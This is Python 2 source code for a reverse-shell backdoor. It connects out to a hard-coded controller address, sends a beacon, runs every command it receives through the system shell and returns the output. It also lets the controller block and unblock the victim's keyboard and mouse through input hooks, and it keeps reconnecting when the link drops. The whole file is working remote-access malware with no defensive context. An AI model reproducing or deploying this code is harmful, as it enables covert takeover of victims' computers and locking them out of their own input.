! /usr/bin/env python

import pythoncom
import pyHook
import socket
import subprocess
import sys
import time

HOST = '127.0.0.1'   
PORT = 22

def setBlock(event):
        return False

def setUnblock(event):
        return True

def blockInput():
    hookManager = pyHook.HookManager()
    hookManager.MouseAll = setBlock
    hookManager.KeyAll = setBlock
    hookManager.HookMouse()
    hookManager.HookKeyboard()
    pythoncom.PumpMessages()

def unblockInput():
    hookManager = pyHook.HookManager()
    hookManager.MouseAll = setUnblock
    hookManager.KeyAll = setUnblock
    hookManager.HookMouse()
    hookManager.HookKeyboard()
    pythoncom.PumpMessages()




def connect((host, port)):

    socketHolder = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	socketHolder.connect((host, port))
    return socketHolder




def run_shell_cmd(socketHolder):

	data = socketHolder.recv(1024)

	if data:

		if data == "exit":

			socketHolder.close()

			sys.exit(0)

                elif data == 'blockInput':

                        blockInput()

                elif data == 'unblockInput':

                        unblockInput()

                elif len(data) == 0:

			return True

		else:

			proc = subprocess.Popen(data, shell=True,

				stdout=subprocess.PIPE, stderr=subprocess.PIPE,

				stdin=subprocess.PIPE)

			stdout_value = proc.stdout.read() + proc.stderr.read()

			socketHolder.send(stdout_value)

			return False

	else:

		print 'Lost connection to host. Will attempt to reconnect.'

		socketHolder = connect((HOST,PORT))

def main():

	socketAlive = True

        while socketAlive:

		dataReceived = True

                try:

                        socketHolder = connect((HOST,PORT))

			socketHolder.send('Night or day?')

                        while dataReceived:

				commandsFromMaster = run_shell_cmd(socketHolder)

                        socketHolder.close()

                except socket.error:

                        pass

if __name__ == "__main__":

        sys.exit(main())